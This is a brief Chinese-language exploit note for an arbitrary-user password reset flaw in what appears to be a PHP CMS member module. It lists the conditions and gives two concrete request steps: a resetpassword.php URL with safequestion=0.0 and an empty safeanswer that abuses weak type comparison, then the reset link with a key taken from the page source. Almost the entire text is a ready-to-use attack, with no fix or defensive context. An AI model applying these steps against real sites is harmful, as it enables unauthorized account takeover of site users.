# 任意用户密码重置漏洞(利用弱类型)
## Reference
* [https://xianzhi.aliyun.com/forum/topic/1926](https://xianzhi.aliyun.com/forum/topic/1926)
## 利用条件
* 管理员开启了会员功能
* 该会员没有设置安全问题
## 利用方式

step1: 访问 URL + /member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=1[修改密码的id]  

step2: 访问源码中的跳转链接类似于 URL + member/resetpassword.php?dopost=getpasswd&id=9&key=dqg3OSQo 修改密码即可
